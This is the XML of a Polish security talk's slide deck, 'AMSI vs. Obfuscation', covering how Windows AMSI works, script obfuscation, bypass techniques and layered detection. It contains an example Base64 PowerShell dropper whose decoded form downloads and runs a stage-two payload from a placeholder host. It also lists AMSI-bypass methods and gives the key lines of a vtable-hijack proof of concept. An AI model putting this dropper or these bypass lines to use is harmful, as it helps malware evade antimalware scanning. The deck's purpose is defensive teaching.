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5" r:id="rId16"/>
    <p:sldId id="264" r:id="rId15"/>
    <p:sldId id="266" r:id="rId17"/>
    <p:sldId id="267" r:id="rId18"/>
    <p:sldId id="268" r:id="rId19"/>
    <p:sldId id="284" r:id="rId35"/>
    <p:sldId id="270" r:id="rId21"/>
    <p:sldId id="271" r:id="rId22"/>
    <p:sldId id="272" r:id="rId23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9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27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AMSI vs. Obfuscation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231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0">
                <a:solidFill>
                  <a:srgbClr val="F58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A Cat-and-Mouse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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Radosław Kumorek  ·  Security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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>45 min  |  CORE edition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327648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github.com/radkum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327648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ABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ramsi-rs  ·  ps-parser  ·  cs-parser  ·  AmsiProviderScanDisruption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1887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  Agenda  –  45 minut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0058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Wprowadzenie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005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2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73352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73352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19072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Zagrożenia w skryptach  (3 slajdy)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1719072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5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86584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386584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32304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Anti-Malware Scan Interface (AMSI)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432304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8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099815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099815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145535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Techniki obfuscacji i AMSI bypass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3145535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12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13048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813048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858768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Wykrywanie i obrona wielowarstwowa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85876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10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526280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VI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7200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Live demo: Hybrid detection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45720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239512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239512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VII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285231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Podsumowanie &amp; Q&amp;A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5285231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3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Zagrożenia w skryptach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5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3657600" cy="21945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25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Dlaczego skrypty są niebezpieczne?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64207"/>
            <a:ext cx="347472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Bezpośrednia bliskość do OS (PS, WMI, VBS, JS)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Nie wymagają kompilacji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Living-off-the-land — trudne do detekcji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80160"/>
            <a:ext cx="3657600" cy="21945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325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Popularne wektory ataku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64207"/>
            <a:ext cx="347472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Script-based malware: ransomware, stealery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Post-exploitation: lateral movement, privesc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Initial access: spear-phishing z .ps1/.vbs/.js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280160"/>
            <a:ext cx="3566160" cy="21945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325880"/>
            <a:ext cx="3383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Przykłady z życia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664207"/>
            <a:ext cx="33832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PowerShell droppers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WMI-based persistence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Obfuscated scripts w phishingu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749039"/>
            <a:ext cx="11612880" cy="914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794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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"Skrypty to miecz obosieczny: produktywność dla deweloperów, ładunek dla atakujących."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Statystyki: skala zagrożenia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2743200" cy="2926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74320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32588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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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ataków wykorzystuje
narzędzia już obecne w OS
(LotL)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70332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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Verizon DBIR 2023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188720"/>
            <a:ext cx="2743200" cy="2926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188720"/>
            <a:ext cx="274320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32588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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>40%+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28600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incydentów zawiera
komponent PowerShell
lub skryptowy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70332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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IBM X-Force 2023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2743200" cy="2926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188720"/>
            <a:ext cx="274320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32588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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>24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28600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zagrożeń zblokowanych
przez AMSI od momentu
wprowadzenia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370332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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Microsoft MSTIC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188720"/>
            <a:ext cx="2743200" cy="2926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188720"/>
            <a:ext cx="274320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32588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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+40%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28600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wzrost ataków
"fileless" (skryptowych)
rok do roku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70332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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CrowdStrike 2023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11612880" cy="13716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370832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Dlaczego skrypty?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110642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Skrypty są atrakcyjne dla atakujących, bo:
▸  działają w kontekście zaufanego procesu (powershell.exe, wscript.exe)
▸  często whitelistowane przez polityki AV
▸  nie zostawiają pliku na dysku (fileless execution)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Techniki ataku opartego na skryptach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3657600" cy="22860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Initial Access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18488"/>
            <a:ext cx="3474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Spear-phishing z załącznikiem .ps1 / .vbs / .js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Makra Office uruchamiające PowerShell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HTML smuggling → decoded payload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ISO/LNK trick omijający Mark-of-the-Web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234440"/>
            <a:ext cx="3657600" cy="22860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Execution &amp; Persistence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18488"/>
            <a:ext cx="3474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Invoke-Expression / IEX z zakodowaną komendą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WMI Event Subscriptions (trwałość bez pliku)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Scheduled Tasks przez PowerShell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Registry Run keys z obfuscowanym payload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234440"/>
            <a:ext cx="3657600" cy="22860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Post-Exploitation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618488"/>
            <a:ext cx="3474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Mimikatz przez Invoke-Mimikatz (PS)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Lateral movement: WMI / WinRM / PSRemoting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Data exfiltration przez Invoke-WebRequest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Credential harvesting: LSASS dump in-memory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49039"/>
            <a:ext cx="11612880" cy="34747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749039"/>
            <a:ext cx="11612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MITRE ATT&amp;CK: T1059.001 (PS)  ·  T1059.005 (VBS)  ·  T1059.007 (JS)  ·  T1546.003 (WMI Event Sub)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519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Typowy łańcuch ataku fileless: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663440"/>
            <a:ext cx="2011680" cy="777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663440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Phishing
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736592"/>
            <a:ext cx="3200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4663440"/>
            <a:ext cx="2011680" cy="777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4663440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Klik
makro/LNK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736592"/>
            <a:ext cx="3200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79" y="4663440"/>
            <a:ext cx="2011680" cy="7772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79" y="4663440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PowerShell
w pamięci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59" y="4736592"/>
            <a:ext cx="3200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199" y="4663440"/>
            <a:ext cx="2011680" cy="777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199" y="4663440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C2
download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736592"/>
            <a:ext cx="3200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19" y="4663440"/>
            <a:ext cx="2011680" cy="77724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46919" y="4663440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Payload
(fileless)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Przykład: PowerShell dropper w phishingu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5486400" cy="40233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98448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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kod odebrany przez ofiarę (obfuscowany)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64208"/>
            <a:ext cx="530352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88FF88"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$a='SQBuAHYAbwBrAGUALQBXAGUAYgBS
AGUACQB1AGUAcwB0ACAAaAB0AHQAcAA6
Ly9iYWQuc2l0ZS9zdGFnZTIucHMx
IC1PdXRGaWxlICRlbnY6VEVNUC91
cGRhdGUuZXhl';
$b=[System.Text.Encoding]::Unicode
  .GetString(
    [Convert]::FromBase64String($a)
  );
iEX $b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234440"/>
            <a:ext cx="5760720" cy="40233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298448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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Po dekodowaniu (ps-parser)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64208"/>
            <a:ext cx="557784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FFCC77"/>
                </a:solidFill>
              </a:rPr>
              <a:t># Stage 1 – download
Invoke-WebRequest `
  http://bad.site/stage2.ps1 `
  -OutFile $env:TEMP\update.exe
# Stage 2 – execute
Start-Process $env:TEMP\update.exe
# Stage 2 payload:
#  → Mimikatz in-memory
#  → LSASS dump → C2 exfil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5176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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ps-parser
→ decode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40680"/>
            <a:ext cx="11612880" cy="1188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5440680"/>
            <a:ext cx="73152" cy="118872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486400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Co widzi AMSI?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70448"/>
            <a:ext cx="1124712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▸  Wersja obfuscowana → string nierozpoznany → może przejść
▸  Wykonanie IEX → AMSI skanuje zdekodowany string w runtime → szansa na detekcję
▸  Jeśli AMSI bypassed wcześniej → stage2 ładuje się bez żadnej kontroli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Anti-Malware Scan Interface (AMSI)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8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12344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73152" cy="123444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43584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AMSI to standardowy interfejs Windows API, który pozwala aplikacji przekazać dowolną treść (skrypt, komendę, bufor) do zarejestrowanego providera antymalware — zanim zostanie wykonana.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06040"/>
            <a:ext cx="27432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606040"/>
            <a:ext cx="274320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715768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3A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Od kiedy?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108960"/>
            <a:ext cx="25603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Windows 10 / Server 2016
(build 1507, 2015)
Rozszerzone w Win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2606040"/>
            <a:ext cx="27432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2606040"/>
            <a:ext cx="2743200" cy="73152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2715768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Po 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108960"/>
            <a:ext cx="25603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Ustandaryzowanie skanowania
skryptów — AV nie musi
patchować każdego hosta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606040"/>
            <a:ext cx="27432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606040"/>
            <a:ext cx="2743200" cy="73152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A7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2715768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A7AAA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kiedy działa?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3108960"/>
            <a:ext cx="25603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Przed wykonaniem każdego
bloku kodu — synchronicznie,
w tym samym procesie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2606040"/>
            <a:ext cx="27432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2606040"/>
            <a:ext cx="2743200" cy="73152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99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2715768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992222"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kiedy NIE działa?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108960"/>
            <a:ext cx="25603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Gdy nie ma zarejestrowanego
providera lub AMSI
został wyłączony/zbypasowany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120640"/>
            <a:ext cx="11612880" cy="15087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184648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Gdzie AMSI jest zintegrowane (built-in)?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PowerShell 5+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każdy blok skryptu
i dynamiczny string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23160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Windows Script
Host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VBScript, JScript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Office 365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makra VBA od
Office 2016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59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79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WMI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79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obiekty COM
przekazane do WMI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75319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.NET / CLR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Assembly.Load()
z byte[]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41280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87000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Exchange
Online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7000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skrypty po stronie
serwera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AMSI — Flow &amp; architektura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02920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64008" cy="1207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AmsiOpenSession()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9344"/>
            <a:ext cx="475488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Aplikacja (np. powershell.exe) otwiera
sesję AMSI — raz na kontekst uruchomienia.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514600"/>
            <a:ext cx="502920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514600"/>
            <a:ext cx="64008" cy="1207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AmsiScanBuffer() / AmsiScanString()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5224"/>
            <a:ext cx="475488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Każdy blok kodu przed wykonaniem
przekazywany do skanowania przez API.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840480"/>
            <a:ext cx="502920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3840480"/>
            <a:ext cx="64008" cy="1207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886200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AMSI Provider (DLL)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61104"/>
            <a:ext cx="475488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Zarejestrowany w HKLM\SOFTWARE\Microsoft\
AMSI\Providers — np. Windows Defender,
SentinelOne, CrowdStrike.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59"/>
            <a:ext cx="502920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5166359"/>
            <a:ext cx="64008" cy="1207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12079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AMSI_RESULT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86983"/>
            <a:ext cx="475488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AMSI_RESULT_CLEAN (0) lub
AMSI_RESULT_DETECTED (32768+)
→ aplikacja blokuje lub kontynuuje.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188720"/>
            <a:ext cx="621792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0" y="1188720"/>
            <a:ext cx="6217920" cy="7315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80160"/>
            <a:ext cx="5852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① Host application
(powershell.exe)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783080"/>
            <a:ext cx="5852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Uruchamia skrypt / dynamiczny blok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2395728"/>
            <a:ext cx="45720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58C1A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2514600"/>
            <a:ext cx="621792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0" y="2514600"/>
            <a:ext cx="621792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2606040"/>
            <a:ext cx="5852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② amsi.dll
AmsiScanBuffer()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3108960"/>
            <a:ext cx="5852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Przekazuje surowy bufor kodu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721608"/>
            <a:ext cx="45720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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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0" y="3840480"/>
            <a:ext cx="621792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0" y="3840480"/>
            <a:ext cx="6217920" cy="73152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A5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06440" y="3931920"/>
            <a:ext cx="5852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③ AMSI Provider
(np. MpOav.dll)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434840"/>
            <a:ext cx="5852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Windows Defender / 3rd-party AV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5047488"/>
            <a:ext cx="45720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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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5166359"/>
            <a:ext cx="621792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0" y="5166359"/>
            <a:ext cx="6217920" cy="73152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8A1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257799"/>
            <a:ext cx="5852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④ Verdict
AMSI_RESULT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6440" y="5760720"/>
            <a:ext cx="5852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CLEAN → execute   |   DETECTED → block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6492240"/>
            <a:ext cx="11612880" cy="25603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Memory protection: AmsiContext jest podpisany kryptograficznie — patchowanie go w pamięci jest wykrywane przez nowsze buildy Windows.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Popularne techniki obfuscacji i AMSI bypass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3657600" cy="24231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3A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AMSI Bypass — Reflection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18488"/>
            <a:ext cx="347472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AmsiUtils.amsiInitFailed = $true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Patch via [Ref].Assembly.GetType(…)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Dostęp przez .NET reflection do prywatnych pól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Patched w PS 5.1+ — wymaga obejścia CLM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Wariant: SetField() na amsiContext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234440"/>
            <a:ext cx="3657600" cy="24231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3A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AMSI Bypass — Patching amsi.dll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18488"/>
            <a:ext cx="347472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VirtualProtect() → zmiana ochrony pamięci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WriteProcessMemory() → NOP/xor rax,rax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Cel: AmsiScanBuffer() lub AmsiOpenSession()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Wymaga SeDebugPrivilege lub self-injection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Wykrywane przez ETW + kernel callbacks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234440"/>
            <a:ext cx="3657600" cy="24231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Obfuscacja PowerShell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618488"/>
            <a:ext cx="347472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String splitting: 'AM'+'SI'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Base64 + [Convert]::FromBase64String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Backtick escaping: `I`E`X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SecureString / char array concat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Invoke-Obfuscation (PSv2 AST rewrite)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840480"/>
            <a:ext cx="36576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88620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3A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AMSI Bypass — COM / Provider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24528"/>
            <a:ext cx="347472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AmsiProviderScanDisruption ← ten talk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Rejestracja własnego AMSI providera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Unregister providera z HKLM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Hooking NtProtectVirtualMemory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3840480"/>
            <a:ext cx="36576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88620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A7AAA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bypass — Środowisko / proces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224528"/>
            <a:ext cx="347472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PSv2 downgrade: powershell -version 2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AMSI_DISABLE_PROVIDER env variable (legacy)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CLM bypass przez custom runspace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Alternate script hosts: cscript / mshta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840480"/>
            <a:ext cx="36576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88620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Obfuscacja C# / .NET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24528"/>
            <a:ext cx="347472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Reflection + DynamicMethod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Assembly.Load() z byte[]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Compile-time string encryption (ConfuserEx)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IL mutation / control flow obfuscation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Analiza: cs-parser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AmsiProviderScanDisruption — vtable hijack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1612880" cy="5029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64008" cy="50292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112471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Technika: podmiana wskaźnika Scan() w vtable COM providera AMSI — całkowicie w user-mode, bez uprawnień admina.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74519"/>
            <a:ext cx="2148840" cy="20116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874519"/>
            <a:ext cx="2148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①
Import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2578608"/>
            <a:ext cx="2011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P/Invoke:
kernel32.dll
+ delegates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423160"/>
            <a:ext cx="18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1874519"/>
            <a:ext cx="2148840" cy="20116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39" y="1874519"/>
            <a:ext cx="2148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②
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578608"/>
            <a:ext cx="2011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Registry:
HKLM\AMSI\
Providers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423160"/>
            <a:ext cx="18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59" y="1874519"/>
            <a:ext cx="2148840" cy="20116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59" y="1874519"/>
            <a:ext cx="2148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③
Instantiate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578608"/>
            <a:ext cx="2011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DllGetClassObject
→ IClassFactory
→ CreateInstance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423160"/>
            <a:ext cx="18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79" y="1874519"/>
            <a:ext cx="2148840" cy="20116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79" y="1874519"/>
            <a:ext cx="2148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④
VTable
hijack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2631" y="2578608"/>
            <a:ext cx="2011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Kopiuj vtable
Scan → ptr do
CloseSession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2423160"/>
            <a:ext cx="18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1874519"/>
            <a:ext cx="2148840" cy="201168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874519"/>
            <a:ext cx="2148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⑤
Execute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578608"/>
            <a:ext cx="2011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Iteracja po
wszystkich
providerach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069080"/>
            <a:ext cx="11612880" cy="12344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64008" cy="12344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114800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3A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kluczowy mechanizm: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498848"/>
            <a:ext cx="1124712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Każdy COM obiekt przechowuje wskaźnik na vtable (tablicę funkcji) jako pierwsze 8 bajtów.
vtable[3] = Scan()   →   nadpisywane wskaźnikiem vtable[4] = CloseSession()
Efekt: każde wywołanie Scan() natychmiast zwraca success bez żadnego skanowania.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486400"/>
            <a:ext cx="11612880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532120"/>
            <a:ext cx="1124712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88FF88"/>
                </a:solidFill>
              </a:rPr>
              <a:t>#  Scan → CloseSession  (kluczowa linia)
[Marshal]::WriteIntPtr($new_vtable,  3 * [IntPtr]::Size,  $closeSessionPtr)
[Marshal]::WriteIntPtr($pObj,  0,  $new_vtable)   # podmień vtable ptr obiektu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Techniki obfuscacji  &amp;  AMSI Bypass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12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3749039" cy="23774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35661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Obfuscacja – podstawy (PS)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18488"/>
            <a:ext cx="3566159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Base64 encoding zmiennych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Łączenie stringów: 'AM'+'SI'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Invoke-Expression + $ExecutionContext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Aliasy i dodatkowe znaki (backtick, format)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34440"/>
            <a:ext cx="3657600" cy="23774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AMSI Bypass – in-memory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18488"/>
            <a:ext cx="347472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Reflection: modyfikacja AmsiContext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Hooking: przejęcie AMSI API calls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Provider disabling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AmsiProviderScanDisruption (PoC C#)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657600" cy="23774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Obfuscacja C#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618488"/>
            <a:ext cx="347472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Dynamiczna kompilacja (Roslyn)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Encoded assemblies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Reflection + DynamicMethod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Analiza: cs-parser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840480"/>
            <a:ext cx="11612880" cy="1874519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904487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Narzędzia zaprezentowane w tej sekcji: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97680"/>
            <a:ext cx="3566160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25112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ps-parser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Parser PowerShella w Rust
crates.io/crates/ps-parser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4297680"/>
            <a:ext cx="3566160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4325112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AmsiProviderScanDisruption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709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Autorski AMSI bypass (C#)
github.com/radkum/...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4297680"/>
            <a:ext cx="3566160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325112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cs-parser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709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Parser C# dla detekcji obfuscacji
github.com/radkum/cs-parser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Wykrywanie — dwie warstwy obrony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10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486400" cy="50292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486400" cy="64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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer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64208"/>
            <a:ext cx="52120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AMSI / Static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48840"/>
            <a:ext cx="516636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① Raw script — wejście do pipeline'u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② Detect obfuscation — jakie techniki użyto?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③ Deobfuscate — ps-parser / cs-parser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④ Deterministic rules — sygnatury, IoCs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⑤ ML na deobfuscowanym — intencja kodu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⑥ ML na oryginalnym — styl obfuscacji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188720"/>
            <a:ext cx="5486400" cy="50292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188720"/>
            <a:ext cx="5486400" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A7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A7AAA"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer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64208"/>
            <a:ext cx="52120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Behavioral / Telemetria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516636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ETW / Sysmon — zdarzenia systemowe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Odczyt HKLM\AMSI\Providers (bypass signal)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PowerShell -version 2 (downgrade)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Podejrzane process tree (Word → PS)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Network connections ze script hostów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LSASS access, credential patterns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329184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BBCC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Layer 1 — Static pipeline (AMSI)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2286000" cy="80467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34440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① Raw script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188720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1353312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Obfuscowany kod — Base64, string split, backtick, encoding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93392"/>
            <a:ext cx="5486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21408"/>
            <a:ext cx="2286000" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C0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167128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② Detect obfuscation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121408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286000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ps-parser: jakie techniki użyto? Entropia, ratio Base64, AST complexity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926080"/>
            <a:ext cx="5486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54096"/>
            <a:ext cx="2286000" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A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099815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③ Deobfuscate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3054096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3218688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ps-parser rozwija kolejne warstwy — wynik: czysty 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858768"/>
            <a:ext cx="5486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986784"/>
            <a:ext cx="2286000" cy="80467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032504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④ Deterministic rules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3986784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4151376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Sygnatury IoC: Reflection.Assembly.Load, kernel32 imports, AMSI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791456"/>
            <a:ext cx="5486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919472"/>
            <a:ext cx="2286000" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A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4965192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⑤ ML — deobfuscowany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4919472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34640" y="5084064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Intencja kodu: dangerous API calls, C2 patterns, credential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724144"/>
            <a:ext cx="5486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852159"/>
            <a:ext cx="2286000" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5020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5897879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⑥ ML — oryginalny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5852159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6016751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Styl obfuscacji: entropia, fragmentacja, głębokość encodingu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5480" y="4956048"/>
            <a:ext cx="2560320" cy="166420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0" y="500176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Dlaczego oba modele?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5349240"/>
            <a:ext cx="2468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BBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deobfuscowany → intencja
(LotL może wyglądać normalnie)
Oryginalny → technika ukrycia
(nowy styl obfuscacji bez sygnatury)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Layer 2 — Behavioral / Telemetria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1612880" cy="5486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64008" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A7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Nie analizujemy kodu — obserwujemy co system robi. Źródła: ETW providers, Sysmon, Windows Event Log.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6596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965960"/>
            <a:ext cx="3749039" cy="64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05740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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Odczyt HKLM\AMSI\Providers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9631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Skrypt enumeruje providerów
przed bypasem — jak w
AmsiProviderScanDisruption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96596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965960"/>
            <a:ext cx="3749039" cy="64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399" y="205740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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PowerShell -version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249631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Downgrade do PSv2 omija
AMSI i Script Block Logging
— silny sygnał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96596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965960"/>
            <a:ext cx="3749039" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C0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05740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05010"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Podejrzane process tree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9631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winword.exe → powershell.exe
explorer.exe → wscript.exe
mshta.exe → cmd.exe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11480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3749039" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C0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20624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05010"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network z script hosta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4515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powershell.exe / wscript.exe
nawiązuje połączenie HTTP/S
— potencjalny C2 download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411480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59" y="4114800"/>
            <a:ext cx="3749039" cy="6400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399" y="420624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A7A3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LSASS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399" y="464515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OpenProcess(LSASS) lub
MiniDumpWriteDump —
credential harvesting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11480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4114800"/>
            <a:ext cx="3749039" cy="6400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20624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A7A3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VirtualProtect na amsi.dll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64515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Zmiana ochrony pamięci
w obszarze amsi.dll —
patch bypass signal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6263640"/>
            <a:ext cx="11612880" cy="48463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29107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ABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ETW providers: Microsoft-Windows-PowerShell (4104)  ·  Microsoft-Antimalware-Scan-Interface  ·  Microsoft-Windows-Threat-Intelligence  ·  Sysmon EventID 1/7/10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Layer 2 — Behavioral / Telemetria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1612880" cy="5486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64008" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A7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Nie analizujemy kodu — obserwujemy co system robi. Źródła: ETW providers, Sysmon, Windows Event Log.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6596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965960"/>
            <a:ext cx="3749039" cy="64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05740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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Odczyt HKLM\AMSI\Providers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9631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Skrypt enumeruje providerów
przed bypasem — jak w
AmsiProviderScanDisruption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96596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965960"/>
            <a:ext cx="3749039" cy="64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399" y="205740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E63A2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PowerShell -version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249631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Downgrade do PSv2 omija
AMSI i Script Block Logging
— silny sygnał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96596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965960"/>
            <a:ext cx="3749039" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C0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05740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05010"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Podejrzane process tree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9631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winword.exe → powershell.exe
explorer.exe → wscript.exe
mshta.exe → cmd.exe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11480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3749039" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C0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20624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05010"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network z script hosta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4515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powershell.exe / wscript.exe
nawiązuje połączenie HTTP/S
— potencjalny C2 download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411480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59" y="4114800"/>
            <a:ext cx="3749039" cy="6400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399" y="420624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A7A3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LSASS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399" y="464515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OpenProcess(LSASS) lub
MiniDumpWriteDump —
credential harvesting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11480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4114800"/>
            <a:ext cx="3749039" cy="6400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20624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A7A3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VirtualProtect na amsi.dll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64515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Zmiana ochrony pamięci
w obszarze amsi.dll —
patch bypass signal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6263640"/>
            <a:ext cx="11612880" cy="48463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29107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ABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ETW providers: Microsoft-Windows-PowerShell (4104)  ·  Microsoft-Antimalware-Scan-Interface  ·  Microsoft-Windows-Threat-Intelligence  ·  Sysmon EventID 1/7/10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1887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  Narzędzia detekcji  &amp;  Wskaźniki zagrożenia (IoCs)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5303520" cy="49377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4937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58C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ramsi-rs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github.com/radkum/ramsi-rs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55648"/>
            <a:ext cx="49377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Rule-based signatures znanych bypass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Heurystyczny ML scoring (unknown obfuscation)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Integracja z endpoint telemetry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Low-resource (native Rust — działa na agentach)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Actionable alerts z confidence scores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Feature vectors → SIEM / downstream ML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914400"/>
            <a:ext cx="5943600" cy="1554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9601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Reflection indicators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298448"/>
            <a:ext cx="5760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System.Reflection.Assembly.Load()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MethodInfo / GetField() / Invoke()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2606040"/>
            <a:ext cx="5943600" cy="1554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265176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Obfuscation indicators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990088"/>
            <a:ext cx="5760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Base64 w plain tekście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Excessive string concatenation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Multiple encoding layers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4297680"/>
            <a:ext cx="5943600" cy="1554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434340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AMSI-specific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4681728"/>
            <a:ext cx="5760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UnmanagedCode permissions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kernel32.dll imports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Memory tampering patterns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Live Demo  –  Hybrid Detection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5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560320" cy="3200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560320" cy="5943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Obfuscated sample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23774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Załadowanie celowo obfuscowanego skryptu PowerShell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79" y="2606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560320" cy="3200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371600"/>
            <a:ext cx="2560320" cy="5943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0574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ps-parser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514600"/>
            <a:ext cx="23774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Rozwinięcie obfuscacji → czysty AST + feature extraction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606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371600"/>
            <a:ext cx="2560320" cy="3200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2560320" cy="5943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3716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0574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ramsi-rs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14600"/>
            <a:ext cx="23774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Rule-based check + ML scoring → confidence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606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371600"/>
            <a:ext cx="2560320" cy="3200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1371600"/>
            <a:ext cx="2560320" cy="5943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13716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0574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Alert &amp; verdict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514600"/>
            <a:ext cx="23774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Actionable alert z wyjaśnieniem dlaczego flagged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846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AABBCC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Środowisko: sandboxowana VM  ·  Sample przygotowany wcześniej  ·  Backup slides dostępne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VI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57432" cy="640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Layer 1 blokuje real-world AMSI bypass</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="0_amsi_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057" y="1325880"/>
            <a:ext cx="8930837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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ETW bypass (sample 28): ramsi-com łapie 3 predykaty - PSEtwLogProvider, etwProvider, System.Management.Automation.Tracing. AMSI_RESULT_DETECTED → czerwony 'ScriptContainedMaliciousContent'. Atak nie wykonuje się.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VI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57432" cy="640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Obfuskowany sample - ściana base64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006" y="1325880"/>
            <a:ext cx="8484939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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>samples/malicious/14_amsi_buffer_path.ps1: cały .NET DLL (AmsiBypass.dll) zakodowany w base64, ładowany przez Reflection.Assembly::Load. Klasyczny fileless loader - payload nigdy nie ląduje na dysku.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VI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57432" cy="640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Layer 1 wykrywa pomimo obfuskacji</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="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351" y="1325880"/>
            <a:ext cx="732225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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deobfuscator dekoduje base64, znajduje wewnątrz binarki strings 'AmsiScanBuffer' i 'amsi.dll'. Status: AMSI BYPASS, confidence 75. Dwa niezależne predykaty: MemoryPatch (Critical) + AmsiDll (High).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VI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57432" cy="640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Layer 1: 96% detection, 2% FP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138" y="1325880"/>
            <a:ext cx="10276676" cy="4160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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pełen scan: 26/27 obfuskowanych bypass'ów wykrytych (real-world samples). 49/50 benign installer scripts (Office, OneDrive, Autopilot) - czyste. Jeden missed: sample 27 (analizowany dalej). Jeden FP: skomplikowany installer.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VI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57432" cy="640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Sample 26 - radkum literal vtable hijack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878" y="1325880"/>
            <a:ext cx="7977195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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
                  <a:srgbClr val="B6C1D1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AMSI provider hijack: czyta CLSID-y, ładuje provider DLL-e, patchuje vtable IAntimalwareProvider (Scan slot → CloseSession). Literalne nazwy w kodzie: DllGetClassObject, WriteIntPtr, AllocHGlobal, UnmanagedFunctionPointer.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VI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57432" cy="640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Layer 1 łapie sample 26 - 6 predykatów</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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6334" y="1325880"/>
            <a:ext cx="6316283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623560"/>
            <a:ext cx="11457432" cy="10972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400">
                <a:solidFill>
